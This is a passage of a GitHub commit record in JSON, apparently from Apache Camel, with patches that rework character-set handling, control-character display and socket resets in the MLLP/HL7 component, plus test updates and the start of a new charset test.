mllpBuffer.toByteArrayAndReset()));\n                     }\n                 }\n             }",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpTcpClientProducer.java",
                "sha": "8cbb492c5d6ae66eacffbbccad44364298ae91b9",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpTcpServerConsumer.java",
                "changes": 36,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpTcpServerConsumer.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 22,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpTcpServerConsumer.java",
                "patch": "@@ -18,7 +18,6 @@\n package org.apache.camel.component.mllp;\n \n import java.io.IOException;\n-import java.io.UnsupportedEncodingException;\n import java.net.BindException;\n import java.net.ServerSocket;\n import java.net.Socket;\n@@ -216,7 +215,7 @@ public void startConsumer(Socket clientSocket, MllpSocketBuffer mllpBuffer) {\n             consumerExecutor.submit(client);\n         } catch (RejectedExecutionException rejectedExecutionEx) {\n             log.warn(\"Cannot start consumer - max consumers already active\");\n-            getEndpoint().doConnectionClose(clientSocket, true, null);\n+            mllpBuffer.resetSocket(clientSocket);\n         }\n     }\n \n@@ -226,8 +225,9 @@ public void processMessage(byte[] hl7MessageBytes, TcpSocketConsumerRunnable con\n         // Send the message on to Camel for processing and wait for the response\n         log.debug(\"Populating the exchange with received message\");\n         Exchange exchange = getEndpoint().createExchange(ExchangePattern.InOut);\n-        // TODO: Evaluate the CHARSET handling - may not be correct\n-        exchange.setProperty(Exchange.CHARSET_NAME, getEndpoint().determineCharset(hl7MessageBytes, null));\n+        if (getConfiguration().hasCharsetName()) {\n+            exchange.setProperty(Exchange.CHARSET_NAME, getConfiguration().getCharsetName());\n+        }\n         try {\n             createUoW(exchange);\n             Message message = exchange.getIn();\n@@ -254,7 +254,7 @@ public void processMessage(byte[] hl7MessageBytes, TcpSocketConsumerRunnable con\n \n             if (getConfiguration().isStringPayload()) {\n                 if (hl7MessageBytes != null && hl7MessageBytes.length > 0) {\n-                    message.setBody(getEndpoint().createNewString(hl7MessageBytes, message.getHeader(MllpConstants.MLLP_CHARSET, String.class)), String.class);\n+                    message.setBody(new String(hl7MessageBytes, getConfiguration().getCharset(exchange, hl7MessageBytes)));\n                 } else {\n                     message.setBody(\"\", String.class);\n                 }\n@@ -308,7 +308,7 @@ void populateHl7DataHeaders(Exchange exchange, Message message, byte[] hl7Messag\n                 log.error(\"Population of message headers failed - unable to find the end of the MSH segment\");\n             } else if (getConfiguration().isHl7Headers()) {\n                 log.debug(\"Populating the HL7 message headers\");\n-                Charset charset = Charset.forName(IOHelper.getCharsetName(exchange));\n+                Charset charset = getConfiguration().getCharset(exchange);\n \n                 for (int i = 2; i < fieldSeparatorIndexes.size(); ++i) {\n                     int startingFieldSeparatorIndex = fieldSeparatorIndexes.get(i - 1);\n@@ -356,9 +356,10 @@ void populateHl7DataHeaders(Exchange exchange, Message message, byte[] hl7Messag\n                             continue;\n                         }\n \n-                        String headerValue = new String(hl7MessageBytes, startingFieldSeparatorIndex + 1,\n-                            endingFieldSeparatorIndex - startingFieldSeparatorIndex - 1,\n-                            charset);\n+                        String headerValue = (i == 17 && getConfiguration().hasCharsetName())\n+                            ? getConfiguration().getCharsetName()\n+                            : new String(hl7MessageBytes, startingFieldSeparatorIndex + 1, endingFieldSeparatorIndex - startingFieldSeparatorIndex - 1, charset);\n+\n                         message.setHeader(headerName, headerValue);\n \n                         // For MSH-9, set a couple more headers\n@@ -498,10 +499,12 @@ void sendAcknowledgement(byte[] originalHl7MessageBytes, Exchange exchange, TcpS\n             message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT_TYPE, acknowledgementMessageType);\n         }\n \n+        Charset charset = getConfiguration().getCharset(exchange);\n+\n         if (consumerRunnable.getMllpBuffer().hasCompleteEnvelope()) {\n             // The mllpBuffer will be used if bufferWrites is set or if auto acknowledgement is used\n             message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT, consumerRunnable.getMllpBuffer().toMllpPayload());\n-            message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT_STRING, consumerRunnable.getMllpBuffer().toHl7String(IOHelper.getCharsetName(exchange, false)));\n+            message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT_STRING, consumerRunnable.getMllpBuffer().toHl7String(charset));\n \n             // Send the acknowledgement\n             if (log.isDebugEnabled()) {\n@@ -519,18 +522,7 @@ void sendAcknowledgement(byte[] originalHl7MessageBytes, Exchange exchange, TcpS\n             }\n         } else if (acknowledgementMessageBytes != null && acknowledgementMessageBytes.length > 0) {\n             message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT, acknowledgementMessageBytes);\n-            String acknowledgementMessageString = \"\";\n-            String exchangeCharset = IOHelper.getCharsetName(exchange, false);\n-            if (exchangeCharset != null && !exchangeCharset.isEmpty()) {\n-                try {\n-                    acknowledgementMessageString = new String(acknowledgementMessageBytes, exchangeCharset);\n-                } catch (UnsupportedEncodingException e) {\n-                    log.warn(\"Failed to covert acknowledgment to string using {} charset - falling back to default charset {}\", exchange, MllpProtocolConstants.DEFAULT_CHARSET);\n-                    acknowledgementMessageString = new String(acknowledgementMessageBytes, MllpProtocolConstants.DEFAULT_CHARSET);\n-                }\n-            } else {\n-                acknowledgementMessageString = new String(acknowledgementMessageBytes, MllpProtocolConstants.DEFAULT_CHARSET);\n-            }\n+            String acknowledgementMessageString = new String(acknowledgementMessageBytes, charset);\n             message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT_STRING, acknowledgementMessageString);\n \n             // Send the acknowledgement",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpTcpServerConsumer.java",
                "sha": "c1ee5dc8c0c1d327efdecf0c39a874ce3d9755d4",
                "status": "modified"
            },
            {
                "additions": 55,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/Hl7Util.java",
                "changes": 101,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/Hl7Util.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 46,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/Hl7Util.java",
                "patch": "@@ -17,10 +17,13 @@\n \n package org.apache.camel.component.mllp.internal;\n \n+import java.nio.charset.Charset;\n import java.nio.charset.StandardCharsets;\n import java.util.ArrayList;\n+import java.util.HashMap;\n import java.util.LinkedList;\n import java.util.List;\n+import java.util.Map;\n \n import org.apache.camel.component.mllp.MllpComponent;\n import org.apache.camel.component.mllp.MllpProtocolConstants;\n@@ -29,22 +32,52 @@\n import org.slf4j.LoggerFactory;\n \n public final class Hl7Util {\n-    public static final String START_OF_BLOCK_REPLACEMENT_VALUE = \"<VT>\";      // VT (vertical tab)        - decimal 11, octal 013\n-    public static final String END_OF_BLOCK_REPLACEMENT_VALUE = \"<FS>\";        // FS (file separator)      - decimal 28, octal 034\n-    public static final String SEGMENT_DELIMITER_REPLACEMENT_VALUE = \"<CR>\";   // CR (carriage return)     - decimal 13, octal 015\n-    public static final String MESSAGE_TERMINATOR_REPLACEMENT_VALUE = \"<LF>\";  // LF (line feed, new line) - decimal 10, octal 012\n-    // Some other non-printable characters\n-    public static final String TAB_REPLACEMENT_VALUE = \"<TAB>\";      // TAB (tab)        - decimal 9, octal 011\n-    public static final String BACKSPACE_REPLACEMENT_VALUE = \"<BS>\";      // BS (backspace)        - decimal 8, octal 010\n-    public static final String FORMFEED_REPLACEMENT_VALUE = \"<FF>\";      // FF (tab)        - decimal 12, octal 014\n-\n     public static final String NULL_REPLACEMENT_VALUE = \"<null>\";\n     public static final String EMPTY_REPLACEMENT_VALUE = \"<>\";\n \n+    public static final Map<Character, String> CHARACTER_REPLACEMENTS;\n+\n     static final int STRING_BUFFER_PAD_SIZE = 100;\n \n     static final Logger LOG = LoggerFactory.getLogger(Hl7Util.class);\n \n+    static {\n+        CHARACTER_REPLACEMENTS = new HashMap<>();\n+        CHARACTER_REPLACEMENTS.put((char)0x00, \"<0x00 NUL>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x01, \"<0x01 SOH>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x02, \"<0x02 STX>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x03, \"<0x03 ETX>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x04, \"<0x04 EOT>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x05, \"<0x05 ENQ>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x06, \"<0x06 ACK>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x07, \"<0x07 BEL>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x08, \"<0x08 BS>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x09, \"<0x09 TAB>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x0A, \"<0x0A LF>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x0B, \"<0x0B VT>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x0C, \"<0x0C FF>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x0D, \"<0x0D CR>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x0E, \"<0x0E SO>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x0F, \"<0x0F SI>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x10, \"<0x10 DLE>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x11, \"<0x11 DC1>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x12, \"<0x12 DC2>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x13, \"<0x13 DC3>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x14, \"<0x14 DC4>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x15, \"<0x15 NAK>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x16, \"<0x16 SYN>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x17, \"<0x17 ETB>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x18, \"<0x18 CAN>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x19, \"<0x19 EM>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x1A, \"<0x1A SUB>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x1B, \"<0x1B ESC>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x1C, \"<0x1C FS>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x1D, \"<0x1D GS>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x1E, \"<0x1E RS>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x1F, \"<0x1F US>\");\n+        CHARACTER_REPLACEMENTS.put((char)0x7F, \"<0x7F DEL>\");\n+    }\n+\n     private Hl7Util() {\n         //utility class, never constructed\n     }\n@@ -133,11 +166,11 @@ public static String generateInvalidPayloadExceptionMessage(final byte[] hl7Byte\n     }\n \n     /**\n-     * Find the String value of MSH-19 (Character set).\n+     * Find the String value of MSH-18 (Character set).\n      *\n      * @param hl7Message the HL7 binary data to search\n      *\n-     * @return the String value of MSH-19, or an empty String if not found.\n+     * @return the String value of MSH-18, or an empty String if not found.\n      */\n     public static String findMsh18(byte[] hl7Message) {\n         String answer = \"\";\n@@ -146,12 +179,12 @@ public static String findMsh18(byte[] hl7Message) {\n \n             List<Integer> fieldSeparatorIndexes = findFieldSeparatorIndicesInSegment(hl7Message, 0);\n \n-            if (fieldSeparatorIndexes.size() > 18) {\n-                int startOfMsh19 = fieldSeparatorIndexes.get(17) + 1;\n-                int length = fieldSeparatorIndexes.get(18) - fieldSeparatorIndexes.get(17) - 1;\n+            if (fieldSeparatorIndexes.size() > 17) {\n+                int startOfMsh19 = fieldSeparatorIndexes.get(16) + 1;\n+                int length = fieldSeparatorIndexes.get(17) - fieldSeparatorIndexes.get(16) - 1;\n \n                 if (length > 0) {\n-                    answer = new String(hl7Message, startOfMsh19, length, StandardCharsets.US_ASCII);\n+                    answer = new String(hl7Message, startOfMsh19, length, MllpComponent.getDefaultCharset());\n                 }\n             }\n         }\n@@ -348,43 +381,19 @@ public static void appendBytesAsPrintFriendlyString(StringBuilder builder, byte[\n     }\n \n     static void appendCharacterAsPrintFriendlyString(StringBuilder builder, char c) {\n-        switch (c) {\n-        case MllpProtocolConstants.START_OF_BLOCK:\n-            builder.append(START_OF_BLOCK_REPLACEMENT_VALUE);\n-            break;\n-        case MllpProtocolConstants.END_OF_BLOCK:\n-            builder.append(END_OF_BLOCK_REPLACEMENT_VALUE);\n-            break;\n-        case MllpProtocolConstants.SEGMENT_DELIMITER:\n-            builder.append(SEGMENT_DELIMITER_REPLACEMENT_VALUE);\n-            break;\n-        case MllpProtocolConstants.MESSAGE_TERMINATOR:\n-            builder.append(MESSAGE_TERMINATOR_REPLACEMENT_VALUE);\n-            break;\n-        default:\n+        if (CHARACTER_REPLACEMENTS.containsKey(c)) {\n+            builder.append(CHARACTER_REPLACEMENTS.get(c));\n+        } else {\n             builder.append(c);\n         }\n     }\n \n     public static String getCharacterAsPrintFriendlyString(char c) {\n-        switch (c) {\n-        case MllpProtocolConstants.START_OF_BLOCK:\n-            return START_OF_BLOCK_REPLACEMENT_VALUE;\n-        case MllpProtocolConstants.END_OF_BLOCK:\n-            return END_OF_BLOCK_REPLACEMENT_VALUE;\n-        case MllpProtocolConstants.SEGMENT_DELIMITER:\n-            return SEGMENT_DELIMITER_REPLACEMENT_VALUE;\n-        case MllpProtocolConstants.MESSAGE_TERMINATOR:\n-            return MESSAGE_TERMINATOR_REPLACEMENT_VALUE;\n-        case '\\t':\n-            return TAB_REPLACEMENT_VALUE;\n-        case '\\b':\n-            return BACKSPACE_REPLACEMENT_VALUE;\n-        case '\\f':\n-            return FORMFEED_REPLACEMENT_VALUE;\n-        default:\n-            return String.valueOf(c);\n+        if (CHARACTER_REPLACEMENTS.containsKey(c)) {\n+            return CHARACTER_REPLACEMENTS.get(c);\n         }\n+\n+        return String.valueOf(c);\n     }\n \n     /**",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/Hl7Util.java",
                "sha": "432ae5c0b51af129b4dcfb5c105192dd235a8a71",
                "status": "modified"
            },
            {
                "additions": 31,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/MllpSocketBuffer.java",
                "changes": 53,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/MllpSocketBuffer.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 22,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/MllpSocketBuffer.java",
                "patch": "@@ -29,6 +29,7 @@\n import java.nio.charset.StandardCharsets;\n import java.util.Arrays;\n \n+import org.apache.camel.component.mllp.MllpComponent;\n import org.apache.camel.component.mllp.MllpEndpoint;\n import org.apache.camel.component.mllp.MllpProtocolConstants;\n import org.apache.camel.component.mllp.MllpSocketException;\n@@ -39,7 +40,6 @@\n  * An OutputStream modeled after the ByteArrayOutputStream specifically for MLLP operations.\n  */\n public class MllpSocketBuffer {\n-    static final Charset DEFAULT_CHARSET = StandardCharsets.US_ASCII;\n     static final int MIN_BUFFER_SIZE = 2048;\n     static final int MAX_BUFFER_SIZE = 0x40000000;  // Approximately 1-GB\n \n@@ -270,7 +270,7 @@ public synchronized void writeTo(Socket socket) throws MllpSocketException {\n \n     @Override\n     public synchronized String toString() {\n-        return toString(DEFAULT_CHARSET);\n+        return toString(MllpComponent.getDefaultCharset());\n     }\n \n     public synchronized String toString(Charset charset) {\n@@ -283,14 +283,17 @@ public synchronized String toString(Charset charset) {\n \n     public synchronized String toString(String charsetName) {\n         if (availableByteCount > 0) {\n-            if (Charset.isSupported(charsetName)) {\n-                Charset charset = Charset.forName(charsetName);\n-                return toString(charset);\n-            } else if (MllpProtocolConstants.MSH18_VALUES.containsKey(charsetName)) {\n-                return toString(MllpProtocolConstants.MSH18_VALUES.get(charsetName));\n-            } else {\n-                return toString(DEFAULT_CHARSET);\n+            try {\n+                if (Charset.isSupported(charsetName)) {\n+                    return toString(Charset.forName(charsetName));\n+                }\n+                log.warn(\"Unsupported character set name {} - using the MLLP default character set {}\", charsetName, MllpComponent.getDefaultCharset());\n+            } catch (Exception charsetEx) {\n+                log.warn(\"Ignoring exception encountered determining character set for name {} - using the MLLP default character set {}\",\n+                    charsetName, MllpComponent.getDefaultCharset(), charsetEx);\n             }\n+\n+            return toString(MllpComponent.getDefaultCharset());\n         }\n \n         return \"\";\n@@ -335,7 +338,7 @@ public String toPrintFriendlyStringAndReset() {\n     }\n \n     public synchronized String toHl7String() {\n-        return this.toHl7String(StandardCharsets.US_ASCII.name());\n+        return this.toHl7String(MllpComponent.getDefaultCharset());\n     }\n \n     public String toHl7StringAndReset() {\n@@ -347,27 +350,33 @@ public String toHl7StringAndReset() {\n     }\n \n     public synchronized String toHl7String(String charsetName) {\n-        String hl7String = null;\n+        if (charsetName != null && !charsetName.isEmpty()) {\n+            try {\n+                if (Charset.isSupported(charsetName)) {\n+                    return toHl7String(Charset.forName(charsetName));\n+                }\n+                log.warn(\"Unsupported character set name {} - using the MLLP default character set {}\", charsetName, MllpComponent.getDefaultCharset());\n+            } catch (Exception charsetEx) {\n+                log.warn(\"Ignoring exception encountered determining character set for name {} - using the MLLP default character set {}\",\n+                    charsetName, MllpComponent.getDefaultCharset(), charsetEx);\n+            }\n+        }\n+\n+        return toHl7String(MllpComponent.getDefaultCharset());\n+    }\n \n+    public synchronized String toHl7String(Charset charset) {\n         if (hasCompleteEnvelope()) {\n             int offset = hasStartOfBlock() ? startOfBlockIndex + 1 : 1;\n             int length = hasEndOfBlock() ? endOfBlockIndex - offset : availableByteCount - startOfBlockIndex - 1;\n             if (length > 0) {\n-                try {\n-                    hl7String = new String(buffer,\n-                        offset,\n-                        length,\n-                        charsetName);\n-                } catch (UnsupportedEncodingException unsupportedEncodingEx) {\n-                    log.warn(\"Failed to create string using {} charset - falling back to default charset {}\", charsetName, MllpProtocolConstants.DEFAULT_CHARSET);\n-                    hl7String = new String(buffer, offset, length, MllpProtocolConstants.DEFAULT_CHARSET);\n-                }\n+                return new String(buffer, offset, length, charset != null ? charset : MllpComponent.getDefaultCharset());\n             } else {\n-                hl7String = \"\";\n+                return \"\";\n             }\n         }\n \n-        return hl7String;\n+        return null;\n     }\n \n     public String toHl7StringAndReset(String charsetName) {",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/MllpSocketBuffer.java",
                "sha": "020ec74f43fecca2f80c6bd1f4051be80e4ee2d9",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/TcpSocketConsumerRunnable.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/TcpSocketConsumerRunnable.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 1,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/TcpSocketConsumerRunnable.java",
                "patch": "@@ -194,7 +194,8 @@ public void run() {\n                             long lastReceivedMessageTicks = consumer.getConsumerRunnables().get(this);\n                             long idleTime = currentTicks - lastReceivedMessageTicks;\n                             if (idleTime >= consumer.getConfiguration().getIdleTimeout()) {\n-                                consumer.getEndpoint().doConnectionClose(clientSocket, true, log);\n+                                String resetMessage = String.format(\"Connection idle time {} exceeded idleTimeout {}\", idleTime, consumer.getConfiguration().getIdleTimeout());\n+                                mllpBuffer.resetSocket(clientSocket, resetMessage);\n                             }\n                         }\n                         log.debug(\"No data received - ignoring timeout\");",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/internal/TcpSocketConsumerRunnable.java",
                "sha": "5780d900f1c6578f16e4d79fdfb146a9cbdc70d6",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpEndpointTest.java",
                "changes": 93,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpEndpointTest.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 93,
                "filename": "components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpEndpointTest.java",
                "patch": "@@ -52,97 +52,4 @@ public void setUp() throws Exception {\n         instance = new MllpEndpoint(\"mllp://dummy\", new MllpComponent(), new MllpConfiguration());\n     }\n \n-    /**\n-     * Description of test.\n-     *\n-     * @throws Exception in the event of a test error.\n-     */\n-    @Test\n-    public void testCreateNewStringWithNullMessage() throws Exception {\n-        assertNull(instance.createNewString(null, null));\n-    }\n-\n-    /**\n-     * Description of test.\n-     *\n-     * @throws Exception in the event of a test error.\n-     */\n-    @Test\n-    public void testCreateNewStringWithEmptyMessage() throws Exception {\n-        byte[] emptyMessage = new byte[0];\n-\n-        assertEquals(\"\", instance.createNewString(emptyMessage, null));\n-    }\n-\n-    /**\n-     * Description of test.\n-     *\n-     * @throws Exception in the event of a test error.\n-     */\n-    @Test\n-    public void testCreateNewStringWithBadMessage() throws Exception {\n-        final String testMessage =\n-            \"MSH|^~\\\\&\" + '\\r' + '\\n';\n-\n-        assertEquals(testMessage, instance.createNewString(testMessage.getBytes(StandardCharsets.ISO_8859_1), null));\n-    }\n-\n-    /**\n-     * Description of test.\n-     *\n-     * @throws Exception in the event of a test error.\n-     */\n-    @Test\n-    public void testCreateNewStringWithBadCharsetSpecifiedAndNoMsh18InMessage() throws Exception {\n-        instance.configuration.charsetName = \"BAD-CHARSET\";\n-\n-        assertEquals(TEST_MESSAGE, instance.createNewString(TEST_MESSAGE.getBytes(StandardCharsets.ISO_8859_1), null));\n-    }\n-\n-    /**\n-     * Description of test.\n-     *\n-     * @throws Exception in the event of a test error.\n-     */\n-    @Test\n-    public void testCreateNewStringWithCharsetSpecifiedAndNoMsh18InMessage() throws Exception {\n-        instance.configuration.charsetName = StandardCharsets.US_ASCII.name();\n-\n-        assertEquals(TEST_MESSAGE, instance.createNewString(TEST_MESSAGE.getBytes(StandardCharsets.ISO_8859_1), null));\n-    }\n-\n-    /**\n-     * Description of test.\n-     *\n-     * @throws Exception in the event of a test error.\n-     */\n-    @Test\n-    public void testCreateNewStringWithoutCharsetSpecifiedAndNoMsh18InMessage() throws Exception {\n-        assertEquals(TEST_MESSAGE, instance.createNewString(TEST_MESSAGE.getBytes(StandardCharsets.ISO_8859_1), null));\n-    }\n-\n-    /**\n-     * Description of test.\n-     *\n-     * @throws Exception in the event of a test error.\n-     */\n-    @Test\n-    public void testCreateNewStringWithoutCharsetSpecifiedAndMsh18PassedToFunction() throws Exception {\n-        final String testMessage = MSH_SEGMENT + \"|||||||8859/1\" + '\\r' + REMAINING_SEGMENTS;\n-\n-        assertEquals(testMessage, instance.createNewString(testMessage.getBytes(StandardCharsets.ISO_8859_1), \"8859/1\"));\n-    }\n-\n-    /**\n-     * Description of test.\n-     *\n-     * @throws Exception in the event of a test error.\n-     */\n-    @Test\n-    public void testCreateNewStringWithoutCharsetSpecifiedAndNoMsh18PassedToFunction() throws Exception {\n-        final String testMessage = MSH_SEGMENT + \"|||||||8859/1\" + '\\r' + REMAINING_SEGMENTS;\n-\n-        assertEquals(testMessage, instance.createNewString(testMessage.getBytes(StandardCharsets.ISO_8859_1), null));\n-    }\n-\n }\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpEndpointTest.java",
                "sha": "2c68e7ed9a85fc1df7e163da1bbeee9335693f97",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpExceptionTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpExceptionTest.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 2,
                "filename": "components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpExceptionTest.java",
                "patch": "@@ -176,15 +176,15 @@ private String expectedMessage(String hl7Message, String hl7Acknowledgment) {\n             expectedMessageBuilder.append(\"\\n\\t{hl7Message [\")\n                 .append(hl7Message.length())\n                 .append(\"] = \")\n-                .append(hl7Message.replaceAll(\"\\r\", \"<CR>\").replaceAll(\"\\n\", \"<LF>\"))\n+                .append(hl7Message.replaceAll(\"\\r\", \"<0x0D CR>\").replaceAll(\"\\n\", \"<0x0A LF>\"))\n                 .append(\"}\");\n         }\n \n         if (hl7Acknowledgment != null) {\n             expectedMessageBuilder.append(\"\\n\\t{hl7Acknowledgement [\")\n                 .append(hl7Acknowledgment.length())\n                 .append(\"] = \")\n-                .append(hl7Acknowledgment.replaceAll(\"\\r\", \"<CR>\").replaceAll(\"\\n\", \"<LF>\"))\n+                .append(hl7Acknowledgment.replaceAll(\"\\r\", \"<0x0D CR>\").replaceAll(\"\\n\", \"<0x0A LF>\"))\n                 .append(\"}\");\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpExceptionTest.java",
                "sha": "6348ba6515882f574aaa7cb61e2e23c737cec059",
                "status": "modified"
            },
            {
                "additions": 150,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpTcpServerCharsetTest.java",
                "changes": 150,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpTcpServerCharsetTest.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 0,
                "filename": "components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpTcpServerCharsetTest.java",
                "patch": "@@ -0,0 +1,150 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+\n+package org.apache.camel.component.mllp;\n+\n+import java.util.concurrent.TimeUnit;\n+\n+import org.apache.camel.CamelContext;\n+import org.apache.camel.EndpointInject;\n+import org.apache.camel.LoggingLevel;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.impl.DefaultCamelContext;\n+import org.apache.camel.test.AvailablePortFinder;\n+import org.apache.camel.test.junit.rule.mllp.MllpClientResource;\n+import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.junit.Rule;\n+import org.junit.Test;\n+\n+public class MllpTcpServerCharsetTest extends CamelTestSupport {\n+    static final String TEST_MESSAGE = \n+        \"MSH|^~\\\\&|KinetDx|UCLA Health System|||201801301506||ORU^R01|18030543772221|P|2.3^^||||||ISO_IR 100|\" + '\\r' \n+        + \"PID|1||1117922||TESTER^MARY||19850627|F\" + '\\r'\n+        + \"OBR|1||55510818|ECH10^TRANSTHORACIC ECHO ADULT COMPLETE^IMGPROC|||20180126103542|||||||||029137^LEIBZON^ROMAN^^^^^^EPIC^^^^PROVID|||||Y|20180130150612|||F\"\n+        +     \"|||||||029137^Leibzon^Roman^^MD^^^^EPIC^^^^PROVID\" + '\\r'\n+        + \"DG1|1|I10|^I10^ HTN (essential)^I10\" + '\\r'\n+        + \"DG1|2|I10|R94.31^Abnormal EKG^I10\" + '\\r'\n+        + \"OBX|1|FT|&GDT||  Thousand Oaks Cardiology||||||F\" + '\\r'\n+        + \"OBX|2|FT|&GDT|| 100 Moody Court, Suite 200||||||F\" + '\\r'\n+        + \"OBX|3|FT|&GDT||  Thousand Oaks, CA 91360||||||F\" + '\\r'\n+        + \"OBX|4|FT|&GDT||    Phone: 